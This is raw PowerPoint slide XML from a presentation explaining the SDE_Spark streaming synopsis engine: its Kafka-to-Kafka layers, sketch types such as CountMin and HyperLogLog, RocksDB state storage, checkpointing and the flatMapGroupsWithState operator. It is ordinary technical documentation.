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0" r:id="rId4"/>
    <p:sldId id="272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21"/>
    <p:sldId id="274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334" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="118" d="100"/>
          <a:sy n="118" d="100"/>
        </p:scale>
        <p:origin x="18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214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94E76-B8FA-43FC-BE05-7B59DFD55F3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019E3-A8BB-4855-ABBB-FACD74A108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48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1 - Ingestion &amp; Parsing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Consume raw bytes from Kafka and deserialize them into typed Java objects.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separate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readStream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sources are opened, one per Kafka topic. Each message arrives as raw bytes;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selectExpr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("CAST value AS STRING") extracts the payload as a UTF-8 string. A map() transformation applies a Jackson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ObjectMapper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deserialize each JSON string into a strongly-typed Java object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 and purely transformational. Parsing failures are isolated and never corrupt downstream state.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2 - Routing &amp; Registration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 incoming data points to the correct synopsis partitions and register synopsis instances in response to management requests.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stateful sub-operators, both implemented as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flatMapGroupsWithState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DataRouter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 hashes the data key, emits N copies of the datapoint tagged with partition keys key_0 through key_(N-1).</a:t>
            </a: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RequestRouter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 validates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{1,2,3,4}, emits one copy per target partition, maintains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RegistrationState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DataRouter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knows active partitions per synopsis.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3 - Synopsis Processing  (Core Layer)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Maintain the lifecycle of all synopsis instances -- creation, data ingestion, query answering, and deletion -- keyed per synopsis partition.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SynopsisProcessor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implemented as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flatMapGroupsWithState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keyed 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partitionKey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Each key maps to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SynopsisProcessorState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stored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RocksDB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Dispatches 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InputEvent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event        -&gt; iterate all active synopses for this key, call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synopsis.add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(datapoint)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REQUEST(ADD)      -&gt;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SynopsisFactory.create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params), store in state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REQUEST(ESTIMATE) -&gt; call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synopsis.estimate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emit Estimation result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REQUEST(DELETE)   -&gt; remove synopsis from state map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SynopsisFactory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 synopsis IDs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SDE_Spark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 1 -&gt; new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CountMin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params)             // Frequency estimation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 2 -&gt; new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Bloomfilter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params)          // Set membership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 3 -&gt; new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AMSsynopsis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params)          // Second-moment estimation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 4 -&gt; new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HyperLogLogSynopsis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params)  // Cardinality estimation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Management &amp; Persistence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Synopsis classes implement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java.io.Serializable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 a project invariant enforced from the first line of code.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RocksDB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serializes state to local SSD on every micro-batch. Spark takes incremental snapshots to HDFS/S3. On restart, state is rehydrated from the checkpoint before processing resumes.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Timeout (TTL)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ADD request may include an optional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field (e.g., "24h", "7d")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Timeout resets after every event that touches the key (activity-based)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safety-net of 7 days for synopses without an explicit TTL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timeout: eviction notice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-1) emitted to output topic before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state.remove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4 - Path Splitting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 each Estimation result to the correct output path based on whether it needs to be merged with partial results from other partitions.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 filter() on the stream of Estimation objects, branching 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noOfP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noOfP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1  -&gt;  GREEN PATH  (direct output, no merging needed)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noOfP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&gt; 1  -&gt;  PURPLE PATH (partial result, send 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ReduceAggregator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filter() calls on Dataset&lt;Estimation&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/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5 - Aggregation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 all partial Estimation results for a given request and merge them into a single final result using a type-specific merge function.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ReduceAggregator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implemented as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flatMapGroupsWithState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keyed on request UID. Accumulates partial Estimation objects until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noOfP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partials arrive, then applies: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CountMin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-&gt;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SimpleSumFunction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(element-wise matrix addition)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BloomFilter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-&gt;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SimpleORFunction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(bitwise OR of bit arrays)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(AMS)         -&gt;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SimpleSumFunction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(element-wise sum)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HyperLogLog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-&gt;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SimpleSumFunction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(register-wise merge)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groupByKey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distributes merge work across the cluster -- each unique request UID is processed on an independent executor.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6 - Output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Serialize final Estimation results back to JSON and publish to the Kafka output topic.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writeStream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.format("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.option("topic", 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estimation_topic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.trigger(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Trigger.ProcessingTime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("1 second"))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.option("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checkpointLocation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hdfsPath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.start()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the GREEN path (direct) and PURPLE path (post-merge) feed into this single output layer. The JSON schema of the Estimation message is byte-for-byte identical to the SDE/Flink output (same field names, same types).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Spark Structured Streaming requires a checkpoint directory — a location where it periodically saves:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ┌─────────────────────────┬─────────────────────────────────────────────────────────────────┐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US" dirty="0"/>
              <a:t>  │      What is saved      │                               Why                               │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├─────────────────────────┼─────────────────────────────────────────────────────────────────┤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Kafka offset positions  │ So it knows which messages have already been processed          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├─────────────────────────┼─────────────────────────────────────────────────────────────────┤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RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> state snapshots │ The actual synopsis data (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>CountMin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> arrays, HLL registers, etc.) │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├─────────────────────────┼─────────────────────────────────────────────────────────────────┤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Operator metadata       │ The pipeline configuration and processing progress              │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  └─────────────────────────┴─────────────────────────────────────────────────────────────────┘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 dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is an embedded key-value database developed by Facebook, optimized for fast reads and writes on local SSD storage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  "Embedded" means it runs inside the same process as your application — it is not a separate server you connect to.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Think of it as a very fast, persistent HashMap that survives restarts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Key                          →   Value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  "Forex_HLL_partition_2"      →   [serialized </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HyperLogLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> bytes]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  "Forex_CountMin_partition_0" →   [serialized </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>CountMin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> bytes]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>request_registry_Forex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"     →   [list of active synopsis IDs]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Spark Structured Streaming needs somewhere to store stateful operator state — in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> that means the actual synopsis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  objects (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>CountMin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> arrays, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>BloomFilter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> bit arrays, HLL registers, etc.).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, in-memory is not acceptable — synopses accumulate data over hours or days. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is the right choice.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Every </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> operator stores its </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>GroupState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;T&gt; in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> automatically. You enable it with one configuration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   line: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spark.conf.set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spark.sql.streaming.stateStore.providerClass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    "org.apache.spark.sql.execution.streaming.state.RocksDBStateStoreProvider"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  );</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  From that point, every time </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> reads or writes its </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessorState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, Spark is reading/writing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  under the hood — transparently, without any extra code in the operator itself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The state object that lives in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> for each partition key looks like this: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SynopsisProcessorState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      Map&lt;String, Synopsis&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>activeSynopses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   ← the actual sketches</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      long </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lastActivityTimestamp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>             ← for TTL / eviction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One critical requirement: every Synopsis class (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>CountMin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>BloomFilter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, AMS, HLL) must implement Serializable in Java —</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> serializes them to bytes when writing and deserializes when reading.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The read/write cycle during processing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Datapoint arrives for key "Forex_2"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Spark calls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessor.call</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(key, events, state)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          ├─► </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()        ← </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> read from local SSD  (~microseconds)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          │       returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessorState</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          ├─► </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hll.add</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("AAPL")   ← update the sketch in memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          └─► </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.update</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(...)  ← </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> write back to local SSD</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Every N seconds (checkpoint interval):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> snapshot → uploaded to HDFS/S3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Pull / push based </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0" err="1"/>
              <a:t>λογικη</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0" err="1"/>
              <a:t>υπαρχει</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0"/>
              <a:t> στο </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>spark?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Micro-batch (pull-based) — default, what we use:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Spark periodically pulls data from Kafka at a configured interval</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Our config: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Trigger.ProcessingTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>config.getTriggerInterval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()) (default 2 seconds)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Every 2 seconds, Spark checks for new Kafka messages, pulls them, processes the batch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Pros: predictable resource usage, easier state management, natural backpressure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Continuous Processing (push-like) — experimental:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Trigger.Continuous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("1 second") — processes records as soon as they arrive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Lower latency (~1ms vs ~100ms+)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - But: very limited — no aggregations, no stateful operations, no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>flatMapGroupsWithState</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - We cannot use this because Layer 3 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) relies heavily on stateful processing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Comparison with Flink:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Flink is push-based by nature — each record is processed immediately as it arrives (true streaming)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Spark's micro-batch adds a small latency overhead but gives better fault tolerance and simpler state checkpointing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - For SDE's use case (synopsis maintenance), the micro-batch delay is negligible since synopses are long-lived data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  structures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Our pipeline uses the pull-based micro-batch model, which is the right choice since we need </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> for</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   the synopsis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19E3-A8BB-4855-ABBB-FACD74A108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8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flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is the most powerful operator in Spark Structured Streaming. It lets you maintain arbitrary,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  long-lived state per key across an infinite stream of events — and produce zero, one, or many output records per invocation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The name breaks down literally:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ┌───────────┬────────────────────────────────────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │   Part    │                  Meaning                   │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────┼────────────────────────────────────────────┤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flat      │ can output 0, 1, or N records per call     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────┼────────────────────────────────────────────┤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Map       │ transforms input events into output events │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────┼────────────────────────────────────────────┤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Groups    │ operates per key (like GROUP BY in SQL)    │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────┼────────────────────────────────────────────┤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WithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> │ you have a persistent state object per key │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  └───────────┴────────────────────────────────────────────┘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why does </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> use it everywhere?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SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> uses it in four places, each for a different reason:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ┌───────────────────┬───────────────┬────────────────────────┬─────────────────────────────────────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │     Operator      │      Key      │       State held       │                   Purpose                   │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────────────┼───────────────┼────────────────────────┼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RequestRouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     │ request ID    │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RegistrationState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      │ Copy one request into N partition copies    │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────────────┼───────────────┼────────────────────────┼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DataRouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        │ stream name   │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DataRoutingState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>       │ Track which synopses listen to which stream │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────────────┼───────────────┼────────────────────────┼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SynopsisProcessor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> │ partition key │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessorState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> │ Hold the actual synopsis objects            │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────────────┼───────────────┼────────────────────────┼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ReduceAggregator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ request UID   │ partial results        │ Collect N partials, merge when complete     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  └───────────────────┴───────────────┴────────────────────────┴─────────────────────────────────────────────┘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  A simpler operator like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> only outputs exactly one record per call. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> outputs an</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
